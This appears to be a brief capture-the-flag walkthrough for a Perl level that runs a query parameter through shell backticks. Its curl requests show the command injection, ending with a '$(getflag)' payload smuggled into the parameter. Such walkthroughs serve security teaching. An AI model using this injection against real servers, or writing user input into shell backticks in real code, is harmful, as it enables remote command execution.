### Documentation
[Perl injection](https://perl-begin.org/topics/security/code-markup-injection/)

### Exploit
1. `cat level04.pl`
   ```perl
   #!/usr/bin/perl
   # localhost:4747
   [...]
     print `echo $y 2>&1`;
   [...]
   x(param("x"));
   ```

2. `curl localhost:4747?x=test`
   ```
   test
   ```

3. `curl 'localhost:4747?x=$(getflag)'`
